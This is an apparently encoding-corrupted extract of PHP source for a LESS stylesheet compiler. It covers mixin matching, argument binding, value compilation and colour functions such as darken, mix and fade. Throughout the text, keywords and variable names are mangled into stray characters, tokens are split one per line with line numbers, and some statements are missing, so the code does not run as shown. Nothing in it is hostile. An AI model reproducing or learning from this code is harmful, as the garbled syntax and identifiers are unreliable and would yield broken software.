	`compeV®ue
($this->
	`»duû
(
$v®ue
)));

484 
$out
[] = 
$s
;

488  
$out
;

489 
	}
}

491 
´Ùeùed
 
funùiÚ
 
	$eq
(
$Ëá
, 
$right
) {

492  
$Ëá
 =ğ
$right
;

493 
	}
}

495 
´Ùeùed
 
funùiÚ
 
	$·‰”nM©ch
(
$block
, 
$Üd”edArgs
, 
$keywÜdArgs
) {

498 ià(!
	`em±y
(
$block
->
gu¬ds
)) {

499 
$groupPas£d
 = 
çl£
;

500 
	`fÜ—ch
 (
$block
->
gu¬ds
 
as
 
$gu¬dGroup
) {

501 
	`fÜ—ch
 (
$gu¬dGroup
 
as
 
$gu¬d
) {

502 
$this
->
	`pushEnv
();

503 
$this
->
	`zS‘Args
(
$block
->
¬gs
, 
$Üd”edArgs
, 
$keywÜdArgs
);

505 
$Ãg©e
 = 
çl£
;

506 ià(
$gu¬d
[0] == "negate") {

507 
$gu¬d
 = $guard[1];

508 
$Ãg©e
 = 
Œue
;

511 
$·s£d
 = 
$this
->
	`»duû
(
$gu¬d
è=ğ
£lf
::
$TRUE
;

512 ià(
$Ãg©e
è
$·s£d
 = !$passed;

514 
$this
->
	`pİEnv
();

516 ià(
$·s£d
) {

517 
$groupPas£d
 = 
Œue
;

519 
$groupPas£d
 = 
çl£
;

524 ià(
$groupPas£d
) ;

527 ià(!
$groupPas£d
) {

528  
çl£
;

532 ià(
	`em±y
(
$block
->
¬gs
)) {

533  
$block
->
isV¬¬g
 || 
	`em±y
(
$Üd”edArgs
è&&ƒm±y(
$keywÜdArgs
);

536 
$»maššgArgs
 = 
$block
->
¬gs
;

537 ià(
$keywÜdArgs
) {

538 
$»maššgArgs
 = 
	`¬¿y
();

539 
	`fÜ—ch
 (
$block
->
¬gs
 
as
 
$¬g
) {

540 ià(
$¬g
[0] =ğ"¬g" && 
	`is£t
(
$keywÜdArgs
[$arg[1]])) {

544 
$»maššgArgs
[] = 
$¬g
;

548 
$i
 = -1;

550 
	`fÜ—ch
 (
$»maššgArgs
 
as
 
$i
 => 
$¬g
) {

551 
$¬g
[0]) {

553 ià(
	`em±y
(
$Üd”edArgs
[
$i
]è|| !
$this
->
	`eq
(
$¬g
[1], $orderedArgs[$i])) {

554  
çl£
;

559 ià(!
	`is£t
(
$Üd”edArgs
[
$i
]è&& !is£t(
$¬g
[2])) {

560  
çl£
;

564 
$i
--;

569 ià(
$block
->
isV¬¬g
) {

570  
Œue
;

572 
$numM©ched
 = 
$i
 + 1;

574  
$numM©ched
 >ğ
	`couÁ
(
$Üd”edArgs
);

576 
	}
}

578 
´Ùeùed
 
funùiÚ
 
·‰”nM©chAÎ
(
$blocks
, 
$Üd”edArgs
, 
$keywÜdArgs
, 
$sk
=
	$¬¿y
()) {

579 
$m©ches
 = 
nuÎ
;

580 
	`fÜ—ch
 (
$blocks
 
as
 
$block
) {

582 ià(
	`is£t
(
$sk
[
$block
->
id
]è&& !is£t($block->
¬gs
)) {

586 ià(
$this
->
	`·‰”nM©ch
(
$block
, 
$Üd”edArgs
, 
$keywÜdArgs
)) {

587 
$m©ches
[] = 
$block
;

591  
$m©ches
;

592 
	}
}

595 
´Ùeùed
 
funùiÚ
 
fšdBlocks
(
$£¬chIn
, 
$·th
, 
$Üd”edArgs
, 
$keywÜdArgs
, 
$£’
=
	$¬¿y
()) {

596 ià(
$£¬chIn
 =ğ
nuÎ
) ‚ull;

597 ià(
	`is£t
(
$£’
[
$£¬chIn
->
id
])è 
nuÎ
;

598 
$£’
[
$£¬chIn
->
id
] = 
Œue
;

600 
$Çme
 = 
$·th
[0];

602 ià(
	`is£t
(
$£¬chIn
->
chd»n
[
$Çme
])) {

603 
$blocks
 = 
$£¬chIn
->
chd»n
[
$Çme
];

604 ià(
	`couÁ
(
$·th
) == 1) {

605 
$m©ches
 = 
$this
->
	`·‰”nM©chAÎ
(
$blocks
, 
$Üd”edArgs
, 
$keywÜdArgs
, 
$£’
);

606 ià(!
	`em±y
(
$m©ches
)) {

609  
$m©ches
;

612 
$m©ches
 = 
	`¬¿y
();

613 
	`fÜ—ch
 (
$blocks
 
as
 
$subBlock
) {

614 
$subM©ches
 = 
$this
->
	`fšdBlocks
(
$subBlock
,

615 
	`¬¿y_¦iû
(
$·th
, 1), 
$Üd”edArgs
, 
$keywÜdArgs
, 
$£’
);

617 ià(!
	`is_nuÎ
(
$subM©ches
)) {

618 
	`fÜ—ch
 (
$subM©ches
 
as
 
$sm
) {

619 
$m©ches
[] = 
$sm
;

624  
	`couÁ
(
$m©ches
è> 0 ? $m©che : 
nuÎ
;

627 ià(
$£¬chIn
->
·»Á
 ==ğ$£¬chInè 
nuÎ
;

628  
$this
->
	`fšdBlocks
(
$£¬chIn
->
·»Á
, 
$·th
, 
$Üd”edArgs
, 
$keywÜdArgs
, 
$£’
);

629 
	}
}

633 
´Ùeùed
 
funùiÚ
 
	$zS‘Args
(
$¬gs
, 
$Üd”edV®ues
, 
$keywÜdV®ues
) {

634 
$assigÃdV®ues
 = 
	`¬¿y
();

636 
$i
 = 0;

637 
	`fÜ—ch
 (
$¬gs
 
as
 
$a
) {

638 ià(
$a
[0] == "arg") {

639 ià(
	`is£t
(
$keywÜdV®ues
[
$a
[1]])) {

641 
$v®ue
 = 
$keywÜdV®ues
[
$a
[1]];

642 } 
	`–£if
 (
	`is£t
(
$Üd”edV®ues
[
$i
])) {

644 
$v®ue
 = 
$Üd”edV®ues
[
$i
];

645 
$i
++;

646 } 
	`–£if
 (
	`is£t
(
$a
[2])) {

648 
$v®ue
 = 
$a
[2];

650 
$this
->
	`throwE¼Ü
("FaedØassigÀ¬g " . 
$a
[1]);

651 
$v®ue
 = 
nuÎ
;

654 
$v®ue
 = 
$this
->
	`»duû
($value);

655 
$this
->
	`£t
(
$a
[1], 
$v®ue
);

656 
$assigÃdV®ues
[] = 
$v®ue
;

659 
$i
++;

664 
$Ï¡
 = 
	`’d
(
$¬gs
);

665 ià(
$Ï¡
[0] == "rest") {

666 
$»¡
 = 
	`¬¿y_¦iû
(
$Üd”edV®ues
, 
	`couÁ
(
$¬gs
) - 1);

667 
$this
->
	`£t
(
$Ï¡
[1], $this->
	`»duû
(
	`¬¿y
("li¡", " ", 
$»¡
)));

671 
$this
->
’v
->
¬gum’ts
 = 
$assigÃdV®ues
 + 
$Üd”edV®ues
;

672 
	}
}

675 
´Ùeùed
 
funùiÚ
 
	$compePrİ
(
$´İ
, 
$block
, 
$out
) {

677 
$this
->
sourûLoc
 = 
	`is£t
(
$´İ
[-1]) ? $prop[-1] : -1;

679 
$´İ
[0]) {

681 
	`li¡
(, 
$Çme
, 
$v®ue
èğ
$´İ
;

682 ià(
$Çme
[0] =ğ
$this
->
vP»fix
) {

683 
$this
->
	`£t
(
$Çme
, 
$v®ue
);

685 
$out
->
lšes
[] = 
$this
->
fÜm©‹r
->
	`´İ”ty
(
$Çme
,

686 
$this
->
	`compeV®ue
($this->
	`»duû
(
$v®ue
)));

690 
	`li¡
(, 
$chd
èğ
$´İ
;

691 
$this
->
	`compeBlock
(
$chd
);

694 
	`li¡
(, 
$·th
, 
$¬gs
, 
$suffix
èğ
$´İ
;

696 
$Üd”edArgs
 = 
	`¬¿y
();

697 
$keywÜdArgs
 = 
	`¬¿y
();

698 
	`fÜ—ch
 ((
¬¿y
)
$¬gs
 
as
 
$¬g
) {

699 
$¬gv®
 = 
nuÎ
;

700 
$¬g
[0]) {

702 ià(!
	`is£t
(
$¬g
[2])) {

703 
$Üd”edArgs
[] = 
$this
->
	`»duû
(
	`¬¿y
("v¬ŸbË", 
$¬g
[1]));

705 
$keywÜdArgs
[
$¬g
[1]] = 
$this
->
	`»duû
($arg[2]);

710 
$Üd”edArgs
[] = 
$this
->
	`»duû
(
$¬g
[1]);

713 
$this
->
	`throwE¼Ü
("UnknowÀ¬gy³: " . 
$¬g
[0]);

717 
$mixšs
 = 
$this
->
	`fšdBlocks
(
$block
, 
$·th
, 
$Üd”edArgs
, 
$keywÜdArgs
);

719 ià(
$mixšs
 ==ğ
nuÎ
) {

720 
$this
->
	`throwE¼Ü
("{$prop[1][0]} is undefined");

723 
	`fÜ—ch
 (
$mixšs
 
as
 
$mixš
) {

724 ià(
$mixš
 ==ğ
$block
 && !
$Üd”edArgs
) {

728 
$haveScİe
 = 
çl£
;

729 ià(
	`is£t
(
$mixš
->
·»Á
->
scİe
)) {

730 
$haveScİe
 = 
Œue
;

731 
$mixšP¬’tEnv
 = 
$this
->
	`pushEnv
();

732 
$mixšP¬’tEnv
->
¡ÜeP¬’t
 = 
$mixš
->
·»Á
->
scİe
;

735 
$haveArgs
 = 
çl£
;

736 ià(
	`is£t
(
$mixš
->
¬gs
)) {

737 
$haveArgs
 = 
Œue
;

738 
$this
->
	`pushEnv
();

739 
$this
->
	`zS‘Args
(
$mixš
->
¬gs
, 
$Üd”edArgs
, 
$keywÜdArgs
);

742 
$ŞdP¬’t
 = 
$mixš
->
·»Á
;

743 ià(
$mixš
 !ğ
$block
è$mixš->
·»Á
 = $block;

745 
	`fÜ—ch
 (
$this
->
	`sÜtPrİs
(
$mixš
->
´İs
è
as
 
$subPrİ
) {

746 ià(
$suffix
 !=ğ
nuÎ
 &&

747 
$subPrİ
[0] == "assign" &&

748 
	`is_¡ršg
(
$subPrİ
[1]) &&

749 
$subPrİ
[1]{0} !ğ
$this
->
vP»fix
)

751 
$subPrİ
[2] = 
	`¬¿y
(

753 
	`¬¿y
(
$subPrİ
[2],‡¼ay('keywÜd', 
$suffix
))

757 
$this
->
	`compePrİ
(
$subPrİ
, 
$mixš
, 
$out
);

760 
$mixš
->
·»Á
 = 
$ŞdP¬’t
;

762 ià(
$haveArgs
è
$this
->
	`pİEnv
();

763 ià(
$haveScİe
è
$this
->
	`pİEnv
();

768 
$out
->
lšes
[] = 
$´İ
[1];

771 
	`li¡
(, 
$Çme
, 
$v®ue
èğ
$´İ
;

772 
$out
->
lšes
[] = "@$Çm" . 
$this
->
	`compeV®ue
($this->
	`»duû
(
$v®ue
)).';';

775 
$out
->
lšes
[] = 
$´İ
[1];

778 
	`li¡
(, 
$impÜtP©h
, 
$impÜtId
èğ
$´İ
;

779 
$impÜtP©h
 = 
$this
->
	`»duû
($importPath);

781 ià(!
	`is£t
(
$this
->
’v
->
impÜts
)) {

782 
$this
->
’v
->
impÜts
 = 
	`¬¿y
();

785 
$»suÉ
 = 
$this
->
	`ŒyImpÜt
(
$impÜtP©h
, 
$block
, 
$out
);

787 
$this
->
’v
->
impÜts
[
$impÜtId
] = 
$»suÉ
 ==ğ
çl£
 ?

788 
	`¬¿y
(
çl£
, "@impÜˆ" . 
$this
->
	`compeV®ue
(
$impÜtP©h
).";") :

789 
$»suÉ
;

793 
	`li¡
(,
$impÜtId
èğ
$´İ
;

794 
$impÜt
 = 
$this
->
’v
->
impÜts
[
$impÜtId
];

795 ià(
$impÜt
[0] ==ğ
çl£
) {

796 ià(
	`is£t
(
$impÜt
[1])) {

797 
$out
->
lšes
[] = 
$impÜt
[1];

800 
	`li¡
(, 
$bÙtom
, 
$·r£r
, 
$impÜtDœ
èğ
$impÜt
;

801 
$this
->
	`compeImpÜ‹dPrİs
(
$bÙtom
, 
$block
, 
$out
, 
$·r£r
, 
$impÜtDœ
);

806 
$this
->
	`throwE¼Ü
("unknown op: {$prop[0]}\n");

808 
	}
}

822 
´Ùeùed
 
funùiÚ
 
	$compeV®ue
(
$v®ue
) {

823 
$v®ue
[0]) {

827  
	`im¶ode
(
$v®ue
[1], 
	`¬¿y_m­
(
	`¬¿y
(
$this
, 'compileValue'), $value[2]));

829 ià(!
	`em±y
(
$this
->
fÜm©‹r
->
com´essCŞÜs
)) {

830  
$this
->
	`compeV®ue
($this->
	`cÛrûCŞÜ
(
$v®ue
));

832  
$v®ue
[1];

835  
$v®ue
[1];

837 
	`li¡
(, 
$num
, 
$un™
èğ
$v®ue
;

840 ià(
$this
->
numb”P»cisiÚ
 !=ğ
nuÎ
) {

841 
$num
 = 
	`round
($num, 
$this
->
numb”P»cisiÚ
);

843  
$num
 . 
$un™
;

846 
	`li¡
(, 
$d–im
, 
$cÚ‹Á
èğ
$v®ue
;

847 
	`fÜ—ch
 (
$cÚ‹Á
 
as
 &
$·¹
) {

848 ià(
	`is_¬¿y
(
$·¹
)) {

849 
$·¹
 = 
$this
->
	`compeV®ue
($part);

852  
$d–im
 . 
	`im¶ode
(
$cÚ‹Á
) . $delim;

858 
	`li¡
(, 
$r
, 
$g
, 
$b
èğ
$v®ue
;

859 
$r
 = 
	`round
($r);

860 
$g
 = 
	`round
($g);

861 
$b
 = 
	`round
($b);

863 ià(
	`couÁ
(
$v®ue
) == 5 && $value[4] != 1) {

864  'rgba('.
$r
.','.
$g
.','.
$b
.','.
$v®ue
[4].')';

867 
$h
 = 
	`¥rštf
("#%02x%02x%02x", 
$r
, 
$g
, 
$b
);

869 ià(!
	`em±y
(
$this
->
fÜm©‹r
->
com´essCŞÜs
)) {

871 ià(
$h
[1] === $h[2] && $h[3] === $h[4] && $h[5] === $h[6]) {

872 
$h
 = '#' . $h[1] . $h[3] . $h[5];

876  
$h
;

879 
	`li¡
(, 
$Çme
, 
$¬gs
èğ
$v®ue
;

880  
$Çme
.'('.
$this
->
	`compeV®ue
(
$¬gs
).')';

882 
$this
->
	`throwE¼Ü
("unknown valueype: $value[0]");

884 
	}
}

886 
´Ùeùed
 
funùiÚ
 
	$lib_pow
(
$¬gs
) {

887 
	`li¡
(
$ba£
, 
$exp
èğ
$this
->
	`as£¹Args
(
$¬gs
, 2, "pow");

888  
	`pow
(
$this
->
	`as£¹Numb”
(
$ba£
), $this->as£¹Numb”(
$exp
));

889 
	}
}

891 
´Ùeùed
 
funùiÚ
 
	$lib_pi
() {

892  
	`pi
();

893 
	}
}

895 
´Ùeùed
 
funùiÚ
 
	$lib_mod
(
$¬gs
) {

896 
	`li¡
(
$a
, 
$b
èğ
$this
->
	`as£¹Args
(
$¬gs
, 2, "mod");

897  
$this
->
	`as£¹Numb”
(
$a
è% $this->as£¹Numb”(
$b
);

898 
	}
}

900 
´Ùeùed
 
funùiÚ
 
	$lib_n
(
$num
) {

901  
	`n
(
$this
->
	`as£¹Numb”
(
$num
));

902 
	}
}

904 
´Ùeùed
 
funùiÚ
 
	$lib_sš
(
$num
) {

905  
	`sš
(
$this
->
	`as£¹Numb”
(
$num
));

906 
	}
}

908 
´Ùeùed
 
funùiÚ
 
	$lib_cos
(
$num
) {

909  
	`cos
(
$this
->
	`as£¹Numb”
(
$num
));

910 
	}
}

912 
´Ùeùed
 
funùiÚ
 
	$lib_©ª
(
$num
) {

913 
$num
 = 
	`©ª
(
$this
->
	`as£¹Numb”
($num));

914  
	`¬¿y
("numb”", 
$num
, "rad");

915 
	}
}

917 
´Ùeùed
 
funùiÚ
 
	$lib_asš
(
$num
) {

918 
$num
 = 
	`asš
(
$this
->
	`as£¹Numb”
($num));

919  
	`¬¿y
("numb”", 
$num
, "rad");

920 
	}
}

922 
´Ùeùed
 
funùiÚ
 
	$lib_acos
(
$num
) {

923 
$num
 = 
	`acos
(
$this
->
	`as£¹Numb”
($num));

924  
	`¬¿y
("numb”", 
$num
, "rad");

925 
	}
}

927 
´Ùeùed
 
funùiÚ
 
	$lib_sq¹
(
$num
) {

928  
	`sq¹
(
$this
->
	`as£¹Numb”
(
$num
));

929 
	}
}

931 
´Ùeùed
 
funùiÚ
 
	$lib_exŒaù
(
$v®ue
) {

932 
	`li¡
(
$li¡
, 
$idx
èğ
$this
->
	`as£¹Args
(
$v®ue
, 2, "extract");

933 
$idx
 = 
$this
->
	`as£¹Numb”
($idx);

935 ià(
$li¡
[0] =ğ"li¡" && 
	`is£t
($li¡[2][
$idx
 - 1])) {

936  
$li¡
[2][
$idx
 - 1];

938 
	}
}

940 
´Ùeùed
 
funùiÚ
 
	$lib_i¢umb”
(
$v®ue
) {

941  
$this
->
	`toBoŞ
(
$v®ue
[0] == "number");

942 
	}
}

944 
´Ùeùed
 
funùiÚ
 
	$lib_is¡ršg
(
$v®ue
) {

945  
$this
->
	`toBoŞ
(
$v®ue
[0] == "string");

946 
	}
}

948 
´Ùeùed
 
funùiÚ
 
	$lib_iscŞÜ
(
$v®ue
) {

949  
$this
->
	`toBoŞ
($this->
	`cÛrûCŞÜ
(
$v®ue
));

950 
	}
}

952 
´Ùeùed
 
funùiÚ
 
	$lib_iskeywÜd
(
$v®ue
) {

953  
$this
->
	`toBoŞ
(
$v®ue
[0] == "keyword");

954 
	}
}

956 
´Ùeùed
 
funùiÚ
 
	$lib_i¥ix–
(
$v®ue
) {

957  
$this
->
	`toBoŞ
(
$v®ue
[0] == "number" && $value[2] == "px");

958 
	}
}

960 
´Ùeùed
 
funùiÚ
 
	$lib_i¥”ûÁage
(
$v®ue
) {

961  
$this
->
	`toBoŞ
(
$v®ue
[0] == "number" && $value[2] == "%");

962 
	}
}

964 
´Ùeùed
 
funùiÚ
 
	$lib_i£m
(
$v®ue
) {

965  
$this
->
	`toBoŞ
(
$v®ue
[0] == "number" && $value[2] == "em");

966 
	}
}

968 
´Ùeùed
 
funùiÚ
 
	$lib_i¤em
(
$v®ue
) {

969  
$this
->
	`toBoŞ
(
$v®ue
[0] == "number" && $value[2] == "rem");

970 
	}
}

972 
´Ùeùed
 
funùiÚ
 
	$lib_rgbahex
(
$cŞÜ
) {

973 
$cŞÜ
 = 
$this
->
	`cÛrûCŞÜ
($color);

974 ià(
	`is_nuÎ
(
$cŞÜ
))

975 
$this
->
	`throwE¼Ü
("colorƒxpected for„gbahex");

977  
	`¥rštf
("#%02x%02x%02x%02x",

978 
	`is£t
(
$cŞÜ
[4]) ? $color[4]*255 : 255,

979 
$cŞÜ
[1],$color[2], $color[3]);

980 
	}
}

982 
´Ùeùed
 
funùiÚ
 
	$lib_¬gb
(
$cŞÜ
){

983  
$this
->
	`lib_rgbahex
(
$cŞÜ
);

984 
	}
}

992 
´Ùeùed
 
funùiÚ
 
	$lib_d©a_uri
(
$v®ue
) {

993 
$mime
 = (
$v®ue
[0] ==ğ'li¡'è? $v®ue[2][0][2] : 
nuÎ
;

994 
$u¾
 = (
$v®ue
[0] === 'list') ? $value[2][1][2][0] : $value[2][0];

996 
$fuÎ·th
 = 
$this
->
	`fšdImpÜt
(
$u¾
);

998 if(
$fuÎ·th
 && (
$fsize
 = 
	`fesize
($fuÎ·th)è!=ğ
çl£
) {

1000 if(
$fsize
/1024 < 32) {

1001 if(
	`is_nuÎ
(
$mime
)) {

1002 if(
	`şass_exi¡s
('finfo')) {

1003 
$fšfo
 = 
Ãw
 
	`fšfo
(
FILEINFO_MIME
);

1004 
$mime
 = 
	`ex¶ode
('; ', 
$fšfo
->
	`fe
(
$fuÎ·th
));

1005 
$mime
 = $mime[0];

1006 } 
	`–£if
(
	`funùiÚ_exi¡s
('mime_content_type')) {

1007 
$mime
 = 
	`mime_cÚ‹Á_ty³
(
$fuÎ·th
);

1011 if(!
	`is_nuÎ
(
$mime
))

1012 
$u¾
 = 
	`¥rštf
('d©a:%s;ba£64,%s', 
$mime
, 
	`ba£64_’code
(
	`fe_g‘_cÚ‹Ás
(
$fuÎ·th
)));

1016  'u¾("'.
$u¾
.'")';

1017 
	}
}

1020 
´Ùeùed
 
funùiÚ
 
	$lib_e
(
$¬g
) {

1021 
$¬g
[0]) {

1023 
$™ems
 = 
$¬g
[2];

1024 ià(
	`is£t
(
$™ems
[0])) {

1025  
$this
->
	`lib_e
(
$™ems
[0]);

1027 
$this
->
	`throwE¼Ü
("unrecognised input");

1029 
$¬g
[1] = "";

1030  
$¬g
;

1032  
$¬g
;

1034  
	`¬¿y
("keywÜd", 
$this
->
	`compeV®ue
(
$¬g
));

1036 
	}
}

1038 
´Ùeùed
 
funùiÚ
 
	$lib__¥rštf
(
$¬gs
) {

1039 ià(
$¬gs
[0] != "list")  $args;

1040 
$v®ues
 = 
$¬gs
[2];

1041 
$¡ršg
 = 
	`¬¿y_shiá
(
$v®ues
);

1042 
$‹m¶©e
 = 
$this
->
	`compeV®ue
($this->
	`lib_e
(
$¡ršg
));

1044 
$i
 = 0;

1045 ià(
	`´eg_m©ch_®l
('/%[d§]/', 
$‹m¶©e
, 
$m
)) {

1046 
	`fÜ—ch
 (
$m
[0] 
as
 
$m©ch
) {

1047 
$v®
 = 
	`is£t
(
$v®ues
[
$i
]) ?

1048 
$this
->
	`»duû
(
$v®ues
[
$i
]è: 
	`¬¿y
('keyword', '');

1051 ià(
$cŞÜ
 = 
$this
->
	`cÛrûCŞÜ
(
$v®
)) {

1052 
$v®
 = 
$cŞÜ
;

1055 
$i
++;

1056 
$»p
 = 
$this
->
	`compeV®ue
($this->
	`lib_e
(
$v®
));

1057 
$‹m¶©e
 = 
	`´eg_»¶aû
('/'.
£lf
::
	`´eg_quÙe
(
$m©ch
).'/',

1058 
$»p
, 
$‹m¶©e
, 1);

1062 
$d
 = 
$¡ršg
[0] == "string" ? $string[1] : '"';

1063  
	`¬¿y
("¡ršg", 
$d
,‡¼ay(
$‹m¶©e
));

1064 
	}
}

1066 
´Ùeùed
 
funùiÚ
 
	$lib_æoÜ
(
$¬g
) {

1067 
$v®ue
 = 
$this
->
	`as£¹Numb”
(
$¬g
);

1068  
	`¬¿y
("numb”", 
	`æoÜ
(
$v®ue
), 
$¬g
[2]);

1069 
	}
}

1071 
´Ùeùed
 
funùiÚ
 
	$lib_û
(
$¬g
) {

1072 
$v®ue
 = 
$this
->
	`as£¹Numb”
(
$¬g
);

1073  
	`¬¿y
("numb”", 
	`û
(
$v®ue
), 
$¬g
[2]);

1074 
	}
}

1076 
´Ùeùed
 
funùiÚ
 
	$lib_round
(
$¬g
) {

1077 if(
$¬g
[0] != "list") {

1078 
$v®ue
 = 
$this
->
	`as£¹Numb”
(
$¬g
);

1079  
	`¬¿y
("numb”", 
	`round
(
$v®ue
), 
$¬g
[2]);

1081 
$v®ue
 = 
$this
->
	`as£¹Numb”
(
$¬g
[2][0]);

1082 
$´ecisiÚ
 = 
$this
->
	`as£¹Numb”
(
$¬g
[2][1]);

1083  
	`¬¿y
("numb”", 
	`round
(
$v®ue
, 
$´ecisiÚ
), 
$¬g
[2][0][2]);

1085 
	}
}

1087 
´Ùeùed
 
funùiÚ
 
	$lib_un™
(
$¬g
) {

1088 ià(
$¬g
[0] == "list") {

1089 
	`li¡
(
$numb”
, 
$ÃwUn™
èğ
$¬g
[2];

1090  
	`¬¿y
("numb”", 
$this
->
	`as£¹Numb”
(
$numb”
),

1091 
$this
->
	`compeV®ue
($this->
	`lib_e
(
$ÃwUn™
)));

1093  
	`¬¿y
("numb”", 
$this
->
	`as£¹Numb”
(
$¬g
), "");

1095 
	}
}

1101 
public
 
funùiÚ
 
	$cŞÜArgs
(
$¬gs
) {

1102 ià(
$¬gs
[0] !ğ'li¡' || 
	`couÁ
($args[2]) < 2) {

1103  
	`¬¿y
(array('color', 0, 0, 0), 0);

1105 
	`li¡
(
$cŞÜ
, 
$d–
èğ
$¬gs
[2];

1106 
$cŞÜ
 = 
$this
->
	`as£¹CŞÜ
($color);

1107 
$d–
 = 
	`æßtv®
($delta[1]);

1109  
	`¬¿y
(
$cŞÜ
, 
$d–
);

1110 
	}
}

1112 
´Ùeùed
 
funùiÚ
 
	$lib_d¬k’
(
$¬gs
) {

1113 
	`li¡
(
$cŞÜ
, 
$d–
èğ
$this
->
	`cŞÜArgs
(
$¬gs
);

1115 
$h¦
 = 
$this
->
	`toHSL
(
$cŞÜ
);

1116 
$h¦
[3] = 
$this
->
	`şamp
($h¦[3] - 
$d–
, 100);

1117  
$this
->
	`toRGB
(
$h¦
);

1118 
	}
}

1120 
´Ùeùed
 
funùiÚ
 
	$lib_ligh‹n
(
$¬gs
) {

1121 
	`li¡
(
$cŞÜ
, 
$d–
èğ
$this
->
	`cŞÜArgs
(
$¬gs
);

1123 
$h¦
 = 
$this
->
	`toHSL
(
$cŞÜ
);

1124 
$h¦
[3] = 
$this
->
	`şamp
($h¦[3] + 
$d–
, 100);

1125  
$this
->
	`toRGB
(
$h¦
);

1126 
	}
}

1128 
´Ùeùed
 
funùiÚ
 
	$lib_§tu¿‹
(
$¬gs
) {

1129 
	`li¡
(
$cŞÜ
, 
$d–
èğ
$this
->
	`cŞÜArgs
(
$¬gs
);

1131 
$h¦
 = 
$this
->
	`toHSL
(
$cŞÜ
);

1132 
$h¦
[2] = 
$this
->
	`şamp
($h¦[2] + 
$d–
, 100);

1133  
$this
->
	`toRGB
(
$h¦
);

1134 
	}
}

1136 
´Ùeùed
 
funùiÚ
 
	$lib_de§tu¿‹
(
$¬gs
) {

1137 
	`li¡
(
$cŞÜ
, 
$d–
èğ
$this
->
	`cŞÜArgs
(
$¬gs
);

1139 
$h¦
 = 
$this
->
	`toHSL
(
$cŞÜ
);

1140 
$h¦
[2] = 
$this
->
	`şamp
($h¦[2] - 
$d–
, 100);

1141  
$this
->
	`toRGB
(
$h¦
);

1142 
	}
}

1144 
´Ùeùed
 
funùiÚ
 
	$lib_¥š
(
$¬gs
) {

1145 
	`li¡
(
$cŞÜ
, 
$d–
èğ
$this
->
	`cŞÜArgs
(
$¬gs
);

1147 
$h¦
 = 
$this
->
	`toHSL
(
$cŞÜ
);

1149 
$h¦
[1] = $h¦[1] + 
$d–
 % 360;

1150 ià(
$h¦
[1] < 0) $hsl[1] += 360;

1152  
$this
->
	`toRGB
(
$h¦
);

1153 
	}
}

1155 
´Ùeùed
 
funùiÚ
 
	$lib_çdeout
(
$¬gs
) {

1156 
	`li¡
(
$cŞÜ
, 
$d–
èğ
$this
->
	`cŞÜArgs
(
$¬gs
);

1157 
$cŞÜ
[4] = 
$this
->
	`şamp
((
	`is£t
($cŞÜ[4]è? $cŞÜ[4] : 1è- 
$d–
/100);

1158  
$cŞÜ
;

1159 
	}
}

1161 
´Ùeùed
 
funùiÚ
 
	$lib_çdeš
(
$¬gs
) {

1162 
	`li¡
(
$cŞÜ
, 
$d–
èğ
$this
->
	`cŞÜArgs
(
$¬gs
);

1163 
$cŞÜ
[4] = 
$this
->
	`şamp
((
	`is£t
($cŞÜ[4]è? $cŞÜ[4] : 1è+ 
$d–
/100);

1164  
$cŞÜ
;

1165 
	}
}

1167 
´Ùeùed
 
funùiÚ
 
	$lib_hue
(
$cŞÜ
) {

1168 
$h¦
 = 
$this
->
	`toHSL
($this->
	`as£¹CŞÜ
(
$cŞÜ
));

1169  
	`round
(
$h¦
[1]);

1170 
	}
}

1172 
´Ùeùed
 
funùiÚ
 
	$lib_§tu¿tiÚ
(
$cŞÜ
) {

1173 
$h¦
 = 
$this
->
	`toHSL
($this->
	`as£¹CŞÜ
(
$cŞÜ
));

1174  
	`round
(
$h¦
[2]);

1175 
	}
}

1177 
´Ùeùed
 
funùiÚ
 
	$lib_lighŠess
(
$cŞÜ
) {

1178 
$h¦
 = 
$this
->
	`toHSL
($this->
	`as£¹CŞÜ
(
$cŞÜ
));

1179  
	`round
(
$h¦
[3]);

1180 
	}
}

1184 
´Ùeùed
 
funùiÚ
 
	$lib_®pha
(
$v®ue
) {

1185 ià(!
	`is_nuÎ
(
$cŞÜ
 = 
$this
->
	`cÛrûCŞÜ
(
$v®ue
))) {

1186  
	`is£t
(
$cŞÜ
[4]) ? $color[4] : 1;

1188 
	}
}

1191 
´Ùeùed
 
funùiÚ
 
	$lib_çde
(
$¬gs
) {

1192 
	`li¡
(
$cŞÜ
, 
$®pha
èğ
$this
->
	`cŞÜArgs
(
$¬gs
);

1193 
$cŞÜ
[4] = 
$this
->
	`şamp
(
$®pha
 / 100.0);

1194  
$cŞÜ
;

1195 
	}
}

1197 
´Ùeùed
 
funùiÚ
 
	$lib_³rûÁage
(
$¬g
) {

1198 
$num
 = 
$this
->
	`as£¹Numb”
(
$¬g
);

1199  
	`¬¿y
("numb”", 
$num
*100, "%");

1200 
	}
}

1205 
´Ùeùed
 
funùiÚ
 
	$lib_mix
(
$¬gs
) {

1206 ià(
$¬gs
[0] !ğ"li¡" || 
	`couÁ
($args[2]) < 2)

1207 
$this
->
	`throwE¼Ü
("mixƒxpects (color1, color2, weight)");

1209 
	`li¡
(
$fœ¡
, 
$£cÚd
èğ
$¬gs
[2];

1210 
$fœ¡
 = 
$this
->
	`as£¹CŞÜ
($first);

1211 
$£cÚd
 = 
$this
->
	`as£¹CŞÜ
($second);

1213 
$fœ¡_a
 = 
$this
->
	`lib_®pha
(
$fœ¡
);

1214 
$£cÚd_a
 = 
$this
->
	`lib_®pha
(
$£cÚd
);

1216 ià(
	`is£t
(
$¬gs
[2][2])) {

1217 
$weight
 = 
$¬gs
[2][2][1] / 100.0;

1219 
$weight
 = 0.5;

1222 
$w
 = 
$weight
 * 2 - 1;

1223 
$a
 = 
$fœ¡_a
 - 
$£cÚd_a
;

1225 
$w1
 = ((
$w
 * 
$a
 == -1 ? $w : ($w + $a)/(1 + $w * $a)) + 1) / 2.0;

1226 
$w2
 = 1.0 - 
$w1
;

1228 
$Ãw
 = 
	`¬¿y
('color',

1229 
$w1
 * 
$fœ¡
[1] + 
$w2
 * 
$£cÚd
[1],

1230 
$w1
 * 
$fœ¡
[2] + 
$w2
 * 
$£cÚd
[2],

1231 
$w1
 * 
$fœ¡
[3] + 
$w2
 * 
$£cÚd
[3],

1234 ià(
$fœ¡_a
 !ğ1.0 || 
$£cÚd_a
 != 1.0) {

1235 
$Ãw
[] = 
$fœ¡_a
 * 
$weight
 + 
$£cÚd_a
 * ($weight - 1);

1238  
$this
->
	`fixCŞÜ
(
$Ãw
);

1239 
	}
}

1241 
´Ùeùed
 
funùiÚ
 
	$lib_cÚŒa¡
(
$¬gs
) {

1242 
$d¬kCŞÜ
 = 
	`¬¿y
('color', 0, 0, 0);

1243 
